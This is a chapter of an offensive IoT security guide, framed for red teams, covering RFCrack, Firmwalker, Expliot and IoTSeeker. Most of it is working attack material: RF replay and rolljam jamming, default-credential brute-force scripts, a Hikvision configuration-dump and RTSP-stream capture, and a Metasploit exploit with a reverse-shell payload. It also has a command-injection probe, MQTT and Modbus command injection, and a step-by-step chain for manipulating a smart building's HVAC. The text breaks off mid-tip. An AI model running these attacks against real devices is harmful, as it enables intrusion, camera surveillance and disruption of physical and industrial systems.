# Chapter 27: IoT Security Tools

## Introduction to IoT Security Assessment

The proliferation of Internet of Things (IoT) devices has dramatically expanded the attack surface of modern organizations. From smart cameras and environmental sensors to industrial control systems and building automation, IoT devices are increasingly integrated into critical infrastructure while often lacking the security controls found in traditional IT systems. For red teams, IoT devices represent both a valuable target and a potential entry point to otherwise well-secured networks.

IoT security assessment presents unique challenges that differ from traditional penetration testing. These devices often use proprietary protocols, custom firmware, specialized hardware interfaces, and novel wireless communications that require specialized tools and techniques to properly evaluate. This chapter explores the essential tools for comprehensive IoT security assessment from a Linux perspective, focusing on practical applications for red team operations.

![IoT security assessment model](./images/iot_security_assessment.png)
*Figure 27.1: IoT security assessment model showing the various layers that require testing*

## RFCrack: Radio Frequency Analysis

Radio Frequency (RF) communications serve as the foundation for many IoT systems, including smart home devices, industrial sensors, medical equipment, and access control systems. RFCrack provides a versatile framework for assessing the security of RF-based systems, particularly those operating in the commonly used 433MHz, 868MHz, and 915MHz bands.

### Core Capabilities

RFCrack offers several key functions for RF security assessment:

1. **Signal Capture**: Record and analyze RF transmissions
2. **Replay Attacks**: Retransmit captured signals to trigger device actions
3. **Rolling Code Analysis**: Work with rolling code systems like garage doors
4. **Jamming**: Disrupt RF communications (where legally permitted)
5. **Brute Force**: Test for vulnerable key patterns

### Hardware Requirements

Unlike purely software-based tools, RFCrack requires specific hardware:

1. **YardStick One**: The primary RF transceiver (required)
2. **HackRF**: Alternative transceiver with broader frequency range (optional)
3. **RTL-SDR**: Software-defined radio for monitoring (recommended)

### Installation

```bash
# Clone the repository
git clone https://github.com/cclabsInc/RFCrack.git
cd RFCrack

# Install dependencies
pip install -r requirements.txt

# Connect YardStick One and check connection
dmesg | grep -i usb
```

### Basic Usage

#### Signal Capture and Replay

```bash
# Launch RFCrack
python RFCrack.py

# Enter interactive mode
set interactive

# Configure frequency for common IoT devices
set freq 433000000

# Start signal capture
set mod ASK_OOK
startrecord

# After capturing the signal (e.g., pressing a remote button)
stoprecord
replay
```

#### Rolling Code Analysis

```bash
# For garage doors and similar systems
set jam true
set mod ASK_OOK
set freq 315000000
rolljam
```

### Common Attacks

#### Simple Key Fob/Remote Replay

```bash
# Configure for typical key fob frequency
set freq 433920000
set mod ASK_OOK
set baud 4800

# Capture and replay
startrecord
# (Activate target device)
stoprecord
replay
```

#### Automated Signal Brute Force

```bash
# For simple fixed-code systems
set freq 433920000
set mod ASK_OOK
fuzz --start 000000 --end FFFFFF
```

### Practical Application: Smart Home Assessment

A complete workflow for assessing a smart home RF environment:

```bash
# 1. Initial RF scanning with RTL-SDR
rtl_power -f 300M:900M:100k -g 50 -i 10 -e 1h output.csv

# 2. Analyze scan results to identify active frequencies
python heatmap.py output.csv heatmap.png

# 3. Target specific active frequencies with RFCrack
python RFCrack.py -f 433920000 -m ASK_OOK -b 4800

# 4. Capture signals from devices like:
# - Garage door openers
# - Door/window sensors
# - Remote controlled outlets
# - Weather stations
# - Car key fobs
```

### Advanced RFCrack Techniques

#### Signal Analysis and Modification

```bash
# Capture and save a signal
startrecord signal1.cap

# Load and analyze the signal
import signal1.cap
analyze

# Modify captured signal
bitflip 10110101 01001010
```

#### Multi-stage attacks

```bash
# Jam and capture approach
set jam true
set freq 315000000
set mod ASK_OOK
# Activate jamming
# While jamming, capture legitimate signal
set capturefile signal1.cap
# End jamming and replay captured signal
replay signal1.cap
```

### Integration with SDR Tools

For more advanced RF analysis, integrate RFCrack with other SDR tools:

```bash
# Identify potential frequencies with rtl_power
rtl_power -f 300M:500M:12.5k -g 50 -i 1 -e 1h scan.csv

# Visualize with heatmap
python heatmap.py scan.csv heatmap.png

# Investigate active frequencies with GNU Radio Companion
# Use the identified frequencies in RFCrack
python RFCrack.py -f 433920000
```

> **RED TEAM TIP:**
>
> When analyzing RF communications for a facility, start broad and then focus. First scan a wide frequency range to identify active channels, then target specific devices. Pay special attention to patterns in activity—many building automation systems follow predictable transmission schedules that can reveal device functions.

## Firmwalker: Firmware Analysis

Firmware is the software that controls IoT devices, often containing hardcoded credentials, encryption keys, API endpoints, and other sensitive information. Firmwalker provides a simple yet effective method for analyzing extracted firmware to identify security issues.

### Core Capabilities

Firmwalker focuses on several key aspects of firmware analysis:

1. **Credential Discovery**: Find hardcoded passwords and keys
2. **Certificate Analysis**: Identify SSL/TLS certificates
3. **Configuration Examination**: Locate configuration files
4. **API Endpoint Detection**: Discover web services and APIs
5. **Sensitive Path Identification**: Find sensitive file paths

### Installation

```bash
# Clone the repository
git clone https://github.com/craigz28/firmwalker.git
cd firmwalker

# Make executable
chmod +x firmwalker.sh
```

### Basic Usage

```bash
# Point firmwalker at an extracted firmware directory
./firmwalker.sh /path/to/extracted/firmware
```

### Firmware Extraction Process

Before using Firmwalker, you need to extract the firmware:

```bash
# Create a working directory
mkdir -p ~/firmware_analysis/extract
cd ~/firmware_analysis

# Download firmware from vendor site or extract directly from device
wget https://vendor.com/path/to/firmware.bin

# Identify firmware type
binwalk firmware.bin

# Extract the filesystem
binwalk -e firmware.bin
```

### Advanced Analysis Workflow

A complete firmware analysis workflow might include:

```bash
# 1. Extract firmware
mkdir firmware_analysis
cd firmware_analysis
binwalk -e firmware.bin

# 2. Run initial firmwalker scan
~/firmwalker/firmwalker.sh _firmware.bin.extracted/

# 3. Examine firmwalker output
cat ~/firmwalker/firmwalker.txt

# 4. Perform detailed password search
grep -r "password" _firmware.bin.extracted/
grep -r "passwd" _firmware.bin.extracted/

# 5. Look for encryption keys
grep -r "BEGIN RSA PRIVATE KEY" _firmware.bin.extracted/

# 6. Check for API tokens
grep -r "api.key\|apikey\|api_key" _firmware.bin.extracted/
```

### Customizing Firmwalker

Modify the search patterns for your specific needs:

```bash
# Edit the firmwalker configuration
nano firmwalker.sh

# Add custom search patterns, for example:
# - Manufacturer-specific strings
# - Product-specific configuration file names
# - Common backdoor indicators
```

### Example: Customized IoT Firmware Scanner

Create an enhanced firmware analysis script based on Firmwalker:

```bash
# Create enhanced scanner
cat > enhanced_firmware_scan.sh << 'EOF'
#!/bin/bash
# Enhanced IoT Firmware Scanner

FIRMWARE_PATH=$1
RESULTS_DIR="firmware_results_$(date +%Y%m%d_%H%M%S)"

if [ -z "$FIRMWARE_PATH" ]; then
  echo "Usage: $0 /path/to/extracted/firmware"
  exit 1
fi

mkdir -p $RESULTS_DIR

echo "[+] Starting enhanced firmware analysis..."
echo "[+] Target: $FIRMWARE_PATH"

# Run firmwalker first
echo "[+] Running basic firmwalker scan..."
firmwalker.sh $FIRMWARE_PATH > $RESULTS_DIR/firmwalker_results.txt

# Find certificates and keys
echo "[+] Looking for certificates and keys..."
find $FIRMWARE_PATH -name "*.pem" -o -name "*.key" -o -name "*.crt" -o -name "*.cer" > $RESULTS_DIR/certificates.txt

# Find configuration files
echo "[+] Locating configuration files..."
find $FIRMWARE_PATH -name "*.conf" -o -name "*.cfg" -o -name "*.ini" -o -name "*.config" -o -name "*.json" > $RESULTS_DIR/config_files.txt

# Search for hardcoded credentials
echo "[+] Searching for hardcoded credentials..."
grep -r -i "password\|passwd\|username\|user\|login\|auth\|credential" $FIRMWARE_PATH --include="*.c" --include="*.h" --include="*.cpp" --include="*.html" --include="*.js" --include="*.php" --include="*.py" > $RESULTS_DIR/hardcoded_credentials.txt

# Look for network configuration
echo "[+] Analyzing network configuration..."
grep -r -i "http\|https\|ftp\|ssh\|telnet\|socket\|port\|host\|ip\|addr" $FIRMWARE_PATH --include="*.c" --include="*.h" --include="*.conf" --include="*.sh" --include="*.py" > $RESULTS_DIR/network_config.txt

# Identify executable files
echo "[+] Identifying executable files..."
find $FIRMWARE_PATH -type f -executable > $RESULTS_DIR/executables.txt

# Check for known backdoor strings
echo "[+] Checking for potential backdoors..."
grep -r -i "backdoor\|debug\|default\|admin\|root\|shell\|cmd\|command\|execute" $FIRMWARE_PATH > $RESULTS_DIR/potential_backdoors.txt

# Search for URLs and IPs
echo "[+] Extracting URLs and IP addresses..."
grep -r -E "(https?://|ftp://)[^\s/$.?#].[^\s]*" $FIRMWARE_PATH > $RESULTS_DIR/urls.txt
grep -r -E "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" $FIRMWARE_PATH > $RESULTS_DIR/ip_addresses.txt

# Summarize findings
echo "[+] Analysis complete. Results saved to $RESULTS_DIR/"
echo "--- Summary ---"
echo "Certificates and keys: $(wc -l < $RESULTS_DIR/certificates.txt)"
echo "Configuration files: $(wc -l < $RESULTS_DIR/config_files.txt)"
echo "Potential hardcoded credentials: $(wc -l < $RESULTS_DIR/hardcoded_credentials.txt)"
echo "Network configurations: $(wc -l < $RESULTS_DIR/network_config.txt)"
echo "Executable files: $(wc -l < $RESULTS_DIR/executables.txt)"
echo "Potential backdoors: $(wc -l < $RESULTS_DIR/potential_backdoors.txt)"
echo "URLs discovered: $(wc -l < $RESULTS_DIR/urls.txt)"
echo "IP addresses found: $(wc -l < $RESULTS_DIR/ip_addresses.txt)"
EOF

chmod +x enhanced_firmware_scan.sh
```

### Understanding Firmware Architecture

Beyond simple string searches, understanding the firmware's architecture is crucial:

```bash
# Identify CPU architecture
file _firmware.bin.extracted/squashfs-root/bin/busybox

# Find startup scripts
find _firmware.bin.extracted/ -name "rcS" -o -name "inittab" -o -name "init.d"

# Locate web server directories
find _firmware.bin.extracted/ -name "www" -o -name "html" -o -name "htdocs"

# Examine service configuration
find _firmware.bin.extracted/ -name "*.service" -o -name "services"
```

### Exploiting Firmware Findings

Once vulnerabilities are identified, develop exploitation strategies:

```bash
# Example: If default credentials found
# 1. Identify the service they apply to
grep -r "username=admin" --include="*.conf" _firmware.bin.extracted/

# 2. Locate the service's network configuration
grep -r "port=" --include="service.conf" _firmware.bin.extracted/

# 3. Create exploitation script
cat > exploit.py << 'EOF'
import requests
import sys

target = sys.argv[1]
url = f"http://{target}:8080/login"
credentials = {"username": "admin", "password": "default_password"}

response = requests.post(url, json=credentials)
if "token" in response.text:
    print(f"[+] Successful authentication! Token: {response.json()['token']}")
    # Continue exploitation...
else:
    print("[-] Authentication failed")
EOF
```

> **RED TEAM TIP:**
>
> When analyzing IoT firmware, focus on functionality that connects to external systems—authentication to cloud services, API keys for external data sources, and integration with enterprise systems—as these often provide the most valuable pivot points for accessing larger networks.

## Expliot: IoT Exploitation Framework

Expliot is a comprehensive framework for testing IoT security, providing modules for various protocols, interfaces, and exploit techniques common in IoT environments. It serves as a specialized penetration testing toolkit designed specifically for IoT systems.

### Core Capabilities

Expliot's functionality spans multiple areas:

1. **Protocol Testing**: Assess MQTT, CoAP, BLE, Zigbee, and more
2. **Hardware Interfaces**: Test I2C, SPI, UART, and JTAG
3. **Web Interface Analysis**: Evaluate web application components
4. **Radio Communications**: Analyze RF and wireless protocols
5. **Fuzzing**: Test input handling and robustness

### Installation

```bash
# Install dependencies
sudo apt-get install python3-pip python3-dev libglib2.0-dev

# Install Expliot
pip3 install expliot

# Verify installation
expliot --version
```

### Basic Usage

```bash
# Launch Expliot
expliot

# List available plugins
plugins

# Get help for a specific plugin
help mqtt.broker.basic
```

### Key Testing Categories

#### MQTT Security Testing

MQTT (Message Queue Telemetry Transport) is a lightweight messaging protocol widely used in IoT:

```bash
# Test an MQTT broker for anonymous access
use mqtt.broker.basic
set host 192.168.1.100
set port 1883
run

# Subscribe to MQTT topics to gather information
use mqtt.broker.sub
set host 192.168.1.100
set port 1883
set topic "#"
run
```

#### BLE Device Testing

Bluetooth Low Energy (BLE) is common in consumer IoT devices:

```bash
# Scan for BLE devices
use ble.scan.basic
run

# Connect to a specific BLE device
use ble.generic.connect
set addr 00:11:22:33:44:55
run

# Enumerate GATT services and characteristics
use ble.generic.enum
set addr 00:11:22:33:44:55
run
```

#### CoAP Discovery and Testing

Constrained Application Protocol (CoAP) is designed for resource-constrained devices:

```bash
# Discover CoAP resources
use coap.generic.discover
set host 192.168.1.100
run

# Read a CoAP resource
use coap.generic.get
set host 192.168.1.100
set uri /.well-known/core
run
```

#### Zigbee Security Assessment

Zigbee is a wireless protocol for home automation and industrial applications:

```bash
# Scan for Zigbee networks (requires supported hardware)
use zigbee.scan.basic
set channel 15
run

# Capture Zigbee traffic
use zigbee.sniff.basic
set channel 15
set duration 60
run
```

### Practical Application: Smart Home Assessment

A methodical approach to assessing a smart home environment using Expliot:

```bash
# 1. Discover devices on the network
use net.scan.tcp
set target 192.168.1.0/24
set ports 80,443,1883,5683,8080
run

# 2. Identify MQTT brokers
use mqtt.broker.basic
set host 192.168.1.100
run

# 3. Listen for device communications
use mqtt.broker.sub
set host 192.168.1.100
set topic "#"
run

# 4. Test identified web interfaces
use web.generic.dir
set host 192.168.1.101
set port 80
run

# 5. Analyze BLE devices
use ble.scan.basic
run
```

### Creating Custom Exploit Modules

For specialized testing, create custom Expliot plugins:

```python
# custom_mqtt_exploit.py
from expliot.core.tests.test import Test, TCategory, TTarget, TLog
from expliot.core.protocols.internet.mqtt import MqttClient

class CustomMqttExploit(Test):
    def __init__(self):
        super().__init__(
            name="Custom MQTT Exploit",
            summary="Custom MQTT broker exploitation",
            descr="This plugin exploits a specific vulnerability in X brand MQTT brokers",
            author="Your Name",
            email="your.email@example.com",
            ref=["https://example.com/vulnerability"],
            category=TCategory(TCategory.MQTT, TCategory.SW, TCategory.EXPLOIT),
            target=TTarget(TTarget.GENERIC, TTarget.GENERIC, TTarget.GENERIC),
        )

        self.argparser.add_argument(
            "-H", "--host", required=True, help="IP address of the target MQTT broker"
        )
        self.argparser.add_argument(
            "-p", "--port", default=1883, type=int, help="Port of the MQTT broker"
        )

    def execute(self):
        host = self.args.host
        port = self.args.port
        
        TLog.generic("Targeting MQTT broker at {}:{}".format(host, port))
        
        try:
            # Connect to the broker
            client = MqttClient()
            client.connect(host, port)
            
            # Exploitation logic here
            # For example, publish a specially crafted message
            client.publish("system/control", payload="reboot")
            
            TLog.success("Exploit successfully executed")
        except Exception as e:
            TLog.fail("Exploitation failed: {}".format(str(e)))
```

Save this file in the Expliot plugins directory to make it available.

### Scripting Expliot for Automated Testing

For large-scale assessments, automate Expliot with Python scripts:

```python
# automated_iot_assessment.py
from expliot.core.interfaces.cli import Cli

def run_plugin(plugin_name, args_dict):
    cli = Cli()
    command = "use {}".format(plugin_name)
    cli.onecmd(command)
    
    for arg, value in args_dict.items():
        cli.onecmd("set {} {}".format(arg, value))
    
    cli.onecmd("run")

def main():
    # Configuration
    target_network = "192.168.1.0/24"
    mqtt_broker = "192.168.1.100"
    
    # Scan network
    run_plugin("net.scan.tcp", {
        "target": target_network,
        "ports": "80,443,1883,5683,8080,8883"
    })
    
    # Test MQTT broker
    run_plugin("mqtt.broker.basic", {
        "host": mqtt_broker,
        "port": "1883"
    })
    
    # Subscribe to all MQTT topics
    run_plugin("mqtt.broker.sub", {
        "host": mqtt_broker,
        "port": "1883",
        "topic": "#"
    })
    
    # Scan for BLE devices
    run_plugin("ble.scan.basic", {})

if __name__ == "__main__":
    main()
```

> **RED TEAM TIP:**
>
> When assessing IoT environments with Expliot, start with passive reconnaissance before active testing. Monitor MQTT topics, sniff BLE advertisements, and observe CoAP discovery responses to understand the ecosystem's architecture. This reveals the communication patterns and potential security weaknesses without disrupting device operation.

## IoTSeeker: IoT Device Discovery

IoTSeeker specializes in identifying vulnerable IoT devices on a network, focusing on devices with default credentials, open telnet ports, and known vulnerabilities. It's particularly effective at discovering IP cameras, DVRs, and industrial control systems that are often deployed with minimal security configuration.

### Core Capabilities

IoTSeeker focuses on:

1. **Default Credential Testing**: Check for factory default passwords
2. **Vulnerable Firmware Detection**: Identify known vulnerable versions
3. **Open Service Discovery**: Find exposed management interfaces
4. **Web Interface Analysis**: Test web-based control panels
5. **Specialized Device Fingerprinting**: Identify specific IoT device models

### Installation

```bash
# Clone the repository
git clone https://github.com/rapid7/IoTSeeker.git
cd IoTSeeker

# Install dependencies
pip install requests ipaddress colorama
```

### Basic Usage

```bash
# Scan a network range
python iotseeker.py -r 192.168.1.0/24

# Scan specific targets
python iotseeker.py -t targets.txt

# Save results to a file
python iotseeker.py -r 192.168.1.0/24 -o scan_results.txt
```

### Device Category Scanning

IoTSeeker can target specific device categories:

```bash
# Scan for IP cameras only
python iotseeker.py -r 192.168.1.0/24 -c camera

# Scan for routers
python iotseeker.py -r 192.168.1.0/24 -c router

# Scan for industrial control systems
python iotseeker.py -r 192.168.1.0/24 -c ics
```

### Credential Testing

Test devices for default and common credentials:

```bash
# Test with default credentials
python iotseeker.py -r 192.168.1.0/24 --test-defaults

# Use custom credential list
python iotseeker.py -r 192.168.1.0/24 -C credentials.txt
```

Where `credentials.txt` contains entries like:
```
admin:admin
admin:password
root:root
admin:1234
```

### Advanced IoT Device Discovery

For comprehensive device discovery, integrate IoTSeeker with additional techniques:

```bash
# Create an integrated discovery script
cat > iot_discovery.sh << 'EOF'
#!/bin/bash
# Comprehensive IoT Device Discovery

NETWORK=$1
OUTPUT_DIR="iot_discovery_$(date +%Y%m%d_%H%M%S)"

if [ -z "$NETWORK" ]; then
  echo "Usage: $0 192.168.1.0/24"
  exit 1
fi

mkdir -p $OUTPUT_DIR

echo "[+] Starting IoT device discovery..."
echo "[+] Target network: $NETWORK"

# Initial network scan
echo "[+] Performing initial network scan..."
nmap -sn $NETWORK -oG $OUTPUT_DIR/live_hosts.gnmap
cat $OUTPUT_DIR/live_hosts.gnmap | grep "Up" | cut -d " " -f 2 > $OUTPUT_DIR/live_hosts.txt

# Service discovery on live hosts
echo "[+] Identifying services on discovered hosts..."
nmap -sV -sC -p 21,22,23,80,443,502,1883,5683,8080,8443,9100 -iL $OUTPUT_DIR/live_hosts.txt -oA $OUTPUT_DIR/service_scan

# Identify web interfaces
echo "[+] Analyzing web interfaces..."
cat $OUTPUT_DIR/service_scan.gnmap | grep "open" | grep -E "80|443|8080|8443" | cut -d " " -f 2 > $OUTPUT_DIR/web_hosts.txt

# Screenshot web interfaces
if command -v cutycapt &> /dev/null; then
  echo "[+] Taking screenshots of web interfaces..."
  mkdir -p $OUTPUT_DIR/screenshots
  while read host; do
    cutycapt --url=http://$host --out=$OUTPUT_DIR/screenshots/$host.png
  done < $OUTPUT_DIR/web_hosts.txt
fi

# Run IoTSeeker
echo "[+] Running IoTSeeker for default credential testing..."
python /path/to/IoTSeeker/iotseeker.py -r $NETWORK -o $OUTPUT_DIR/iotseeker_results.txt

# MQTT discovery
echo "[+] Checking for MQTT brokers..."
cat $OUTPUT_DIR/service_scan.gnmap | grep "open" | grep "1883" | cut -d " " -f 2 > $OUTPUT_DIR/mqtt_brokers.txt
if [ -s $OUTPUT_DIR/mqtt_brokers.txt ]; then
  while read broker; do
    timeout 5 mosquitto_sub -h $broker -t "#" -v >> $OUTPUT_DIR/mqtt_traffic.txt 2>/dev/null
  done < $OUTPUT_DIR/mqtt_brokers.txt
fi

# Check for Modbus devices (ICS)
echo "[+] Checking for Modbus devices..."
cat $OUTPUT_DIR/service_scan.gnmap | grep "open" | grep "502" | cut -d " " -f 2 > $OUTPUT_DIR/modbus_devices.txt
if [ -s $OUTPUT_DIR/modbus_devices.txt ]; then
  while read device; do
    python -m pymodbus.repl.client tcp --host $device --port 502 --count 10 --slave 1 >> $OUTPUT_DIR/modbus_info.txt 2>/dev/null
  done < $OUTPUT_DIR/modbus_devices.txt
fi

echo "[+] Discovery complete. Results saved to $OUTPUT_DIR/"
echo "[+] Found $(wc -l < $OUTPUT_DIR/live_hosts.txt) live hosts"
echo "[+] Found $(wc -l < $OUTPUT_DIR/web_hosts.txt) web interfaces"
echo "[+] Found $(wc -l < $OUTPUT_DIR/mqtt_brokers.txt) MQTT brokers"
echo "[+] Found $(wc -l < $OUTPUT_DIR/modbus_devices.txt) Modbus devices"
EOF

chmod +x iot_discovery.sh
```

### Exploiting Discovered Devices

Once vulnerable devices are identified, leverage specialized exploitation techniques:

```bash
# Example: Exploiting a vulnerable IP camera
# 1. First identify the model and check for known exploits
searchsploit hikvision

# 2. For cameras with default credentials, access the management interface
curl -u admin:admin http://192.168.1.100/System/configurationFile?auth=YWRtaW46YWRtaW4= --output config.backup

# 3. Extract credentials and device information from the configuration
grep -a "password" config.backup

# 4. Access the RTSP stream
ffmpeg -i rtsp://admin:admin@192.168.1.100:554/Streaming/Channels/101 -c copy evidence.mp4
```

### Device Fingerprinting Techniques

Enhance IoTSeeker with additional fingerprinting methods:

```bash
# Banner grabbing
nc -v 192.168.1.100 23
nc -v 192.168.1.100 80

# HTTP header analysis
curl -I http://192.168.1.100

# Service identification
nmap -sV -p 80,443,8080 192.168.1.100

# UDP service discovery (many IoT protocols use UDP)
nmap -sU -p 161,1900,5353 192.168.1.100
```

### Integration with Metasploit

For devices with known vulnerabilities, use Metasploit for exploitation:

```bash
# Launch Metasploit
msfconsole

# Example: Exploiting a vulnerable router
use auxiliary/scanner/http/dlink_dir_session_cgi_http_login
set RHOSTS 192.168.1.100
run

# Example: Exploiting IP camera backdoor
use exploit/linux/http/hikvision_dvr_rce
set RHOSTS 192.168.1.100
set PAYLOAD linux/armle/meterpreter/reverse_tcp
set LHOST 192.168.1.200
exploit
```

> **RED TEAM TIP:**
>
> When discovering IoT devices, pay special attention to the "forgotten" devices—those installed for specific projects or temporary purposes that were never properly decommissioned. These often retain default credentials and outdated firmware, making them perfect entry points to otherwise secure networks.

## Specialized IoT Attack Strategies

Beyond the core tools covered, several specialized techniques are valuable for comprehensive IoT security assessment. This section covers targeted approaches for specific IoT attack scenarios.

### Attacking IoT Web Interfaces

Many IoT devices expose web interfaces that have common vulnerabilities:

```bash
# Create a script targeting common IoT web vulnerabilities
cat > iot_web_check.sh << 'EOF'
#!/bin/bash
# IoT Web Interface Vulnerability Scanner

TARGET=$1
OUTPUT_DIR="iot_web_scan_$(date +%Y%m%d_%H%M%S)"

if [ -z "$TARGET" ]; then
  echo "Usage: $0 https://device-ip"
  exit 1
fi

mkdir -p $OUTPUT_DIR

echo "[+] Scanning IoT web interface at $TARGET"

# Check for default credentials
echo "[+] Testing default credentials..."
for creds in "admin:admin" "admin:password" "admin:1234" "root:root" "user:user"; do
  username=$(echo $creds | cut -d':' -f1)
  password=$(echo $creds | cut -d':' -f2)
  
  status=$(curl -s -o /dev/null -w "%{http_code}" -u "$username:$password" $TARGET)
  if [ $status -eq 200 ] || [ $status -eq 302 ]; then
    echo "[!] Successful authentication with $username:$password"
    echo "$TARGET: $username:$password" >> $OUTPUT_DIR/valid_credentials.txt
  fi
done

# Check for common directories
echo "[+] Checking for sensitive directories..."
for dir in "cgi-bin" "admin" "management" "config" "backup" "system" "debug" "dev" "status" "firmware"; do
  status=$(curl -s -o /dev/null -w "%{http_code}" $TARGET/$dir/)
  if [ $status -eq 200 ] || [ $status -eq 401 ] || [ $status -eq 403 ]; then
    echo "[!] Found directory: $TARGET/$dir/ ($status)"
    echo "$TARGET/$dir/: $status" >> $OUTPUT_DIR/directories.txt
  fi
done

# Check for common vulnerabilities
echo "[+] Testing for common IoT web vulnerabilities..."

# Command injection test
echo "[+] Testing for command injection..."
cmd_inj_result=$(curl -s "$TARGET/ping.cgi?ping=127.0.0.1;id" | grep -i "uid=")
if [ ! -z "$cmd_inj_result" ]; then
  echo "[!] Possible command injection vulnerability!"
  echo "$TARGET: Command Injection" >> $OUTPUT_DIR/vulnerabilities.txt
fi

# CSRF test
echo "[+] Checking CSRF protections..."
csrf_tokens=$(curl -s $TARGET | grep -i "csrf")
if [ -z "$csrf_tokens" ]; then
  echo "[!] No CSRF tokens found, may be vulnerable to CSRF"
  echo "$TARGET: Potential CSRF vulnerability" >> $OUTPUT_DIR/vulnerabilities.txt
fi

# Check for information disclosure
echo "[+] Testing for information disclosure..."
curl -s $TARGET > $OUTPUT_DIR/homepage.html
grep -i "firmware" $OUTPUT_DIR/homepage.html > $OUTPUT_DIR/firmware_info.txt
grep -i "version" $OUTPUT_DIR/homepage.html >> $OUTPUT_DIR/firmware_info.txt
grep -i "model" $OUTPUT_DIR/homepage.html >> $OUTPUT_DIR/firmware_info.txt

echo "[+] Web interface assessment complete. Results in $OUTPUT_DIR/"
EOF

chmod +x iot_web_check.sh
```

### UART/JTAG Hardware Interface Attacks

Physical hardware interfaces can provide root access to devices:

```bash
# Using flashrom to read firmware through SPI
sudo flashrom -p buspirate_spi:dev=/dev/ttyUSB0 -r firmware_backup.bin

# Using screen to connect to UART console
sudo screen /dev/ttyUSB0 115200

# After connecting, try common break sequences during boot
# Often pressing keys like 'u', spacebar, or specific key combinations
# will interrupt the boot process and provide a shell

# Common credentials to try on bootloader/shell prompts
# root:root
# admin:admin
# <blank>:<blank>
```

### Zigbee/Z-Wave Network Attacks

For home automation networks using Zigbee or Z-Wave:

```bash
# Using KillerBee for Zigbee networks (requires supported hardware)
zbstumbler
zbdump -f capture.pcap -c 15
zbgoodfind capture.pcap
```

For Z-Wave networks:
```bash
# Using Z-Wave-JS and specialized hardware
sudo apt-get install nodejs npm
npm install -g @zwave-js/server
zwave-js-server --port 7337
```

### BLE Device Exploitation

For Bluetooth Low Energy devices:

```bash
# Initial scanning
sudo hcitool lescan

# Connect and enumerate with gatttool
sudo gatttool -b DE:AD:BE:EF:12:34 -I
# (In interactive mode)
> connect
> primary
> characteristics

# Sniff BLE traffic with Wireshark
sudo btmon -w ble_capture.pcap
```

### MQTT Broker Takeover

For vulnerable MQTT brokers:

```bash
# Listen for all topics
mosquitto_sub -h 192.168.1.100 -t "#" -v

# Publish control messages
mosquitto_pub -h 192.168.1.100 -t "home/livingroom/light" -m "ON"

# Inject malicious commands (if device accepts commands via MQTT)
mosquitto_pub -h 192.168.1.100 -t "device/command" -m '{"action":"reboot"}'
```

### Modbus Industrial Control Exploitation

For industrial systems using Modbus:

```bash
# Install modbus-cli
pip install modbus-cli

# Read coils from a Modbus device
modbus read 192.168.1.100 coils 0 10

# Write to a register
modbus write 192.168.1.100 register 40001 123
```

### Practical Attack Chain: Smart Building Compromise

A complete attack methodology for a smart building system:

```bash
# 1. Discover devices and systems
./iot_discovery.sh 192.168.1.0/24

# 2. Identify vulnerable building automation controllers
python iotseeker.py -r 192.168.1.0/24 -c building

# 3. Exploit web interface of building controller
./iot_web_check.sh http://192.168.1.100

# 4. Access MQTT broker used by building systems
mosquitto_sub -h 192.168.1.101 -t "#" -v | tee mqtt_traffic.txt

# 5. Analyze MQTT traffic to identify control topics
grep -E "temperature|hvac|control|command" mqtt_traffic.txt

# 6. Inject commands to manipulate building systems
mosquitto_pub -h 192.168.1.101 -t "building/zone1/hvac" -m '{"temp":30,"mode":"cool"}'

# 7. Demonstrate impact (without causing damage)
# - Adjust temperature setpoints slightly
# - Toggle non-critical systems
# - Demonstrate access to security controls
```

### Creating a Comprehensive IoT Assessment Toolkit

Combine all the tools covered into a cohesive red team toolkit:

```bash
# Create toolkit deployment script
cat > deploy_iot_toolkit.sh << 'EOF'
#!/bin/bash
# IoT Red Team Toolkit Deployment

TOOLKIT_DIR="/opt/iot-redteam"
mkdir -p $TOOLKIT_DIR
cd $TOOLKIT_DIR

echo "[+] Setting up IoT Red Team Toolkit..."

# Install core dependencies
echo "[+] Installing dependencies..."
sudo apt-get update
sudo apt-get install -y python3 python3-pip git screen nmap curl mosquitto-clients wireshark-qt

# Install RFCrack
echo "[+] Installing RFCrack..."
git clone https://github.com/cclabsInc/RFCrack.git
cd RFCrack
pip3 install -r requirements.txt
cd ..

# Install firmwalker
echo "[+] Installing firmwalker..."
git clone https://github.com/craigz28/firmwalker.git
chmod +x firmwalker/firmwalker.sh

# Install Expliot
echo "[+] Installing Expliot..."
pip3 install expliot

# Install IoTSeeker
echo "[+] Installing IoTSeeker..."
git clone https://github.com/rapid7/IoTSeeker.git
pip3 install requests ipaddress colorama

# Install BLE tools
echo "[+] Installing BLE tools..."
sudo apt-get install -y bluetooth bluez libbluetooth-dev bluez-tools

# Install specialized IoT tools
echo "[+] Installing specialized tools..."
pip3 install modbus-cli
pip3 install pymodbus

# Copy custom scripts
echo "[+] Setting up custom scripts..."
cat > $TOOLKIT_DIR/iot_assessment.sh << 'END'
#!/bin/bash
echo "IoT Red Team Assessment"
echo "1. RF Analysis (RFCrack)"
echo "2. Firmware Analysis (firmwalker)"
echo "3. IoT Exploitation (Expliot)"
echo "4. Device Discovery (IoTSeeker)"
echo "5. Web Interface Assessment"
echo "6. MQTT Analysis"
echo "7. BLE Device Testing"
echo "8. UART/Hardware Interface"
echo "9. Full Assessment Suite"
read -p "Select option: " option

case $option in
  1) cd $TOOLKIT_DIR/RFCrack && python RFCrack.py ;;
  2) read -p "Path to extracted firmware: " firmware_path
     $TOOLKIT_DIR/firmwalker/firmwalker.sh $firmware_path ;;
  3) expliot ;;
  4) read -p "Target network: " network
     python $TOOLKIT_DIR/IoTSeeker/iotseeker.py -r $network ;;
  5) read -p "Target URL: " url
     $TOOLKIT_DIR/iot_web_check.sh $url ;;
  6) read -p "MQTT broker IP: " broker
     mosquitto_sub -h $broker -t "#" -v | tee mqtt_traffic.txt ;;
  7) sudo hcitool lescan ;;
  8) read -p "Serial port (e.g., /dev/ttyUSB0): " port
     sudo screen $port 115200 ;;
  9) read -p "Target network: " network
     $TOOLKIT_DIR/iot_discovery.sh $network ;;
  *) echo "Invalid option" ;;
esac
END

chmod +x $TOOLKIT_DIR/iot_assessment.sh

# Create launcher
echo "[+] Creating launcher..."
cat > /usr/local/bin/iot-redteam << EOF
#!/bin/bash
cd $TOOLKIT_DIR
./iot_assessment.sh
EOF
chmod +x /usr/local/bin/iot-redteam

echo "[+] IoT Red Team Toolkit installed successfully!"
echo "[+] Run 'iot-redteam' to launch the toolkit"
EOF

chmod +x deploy_iot_toolkit.sh
```

> **RED TEAM TIP:**
>
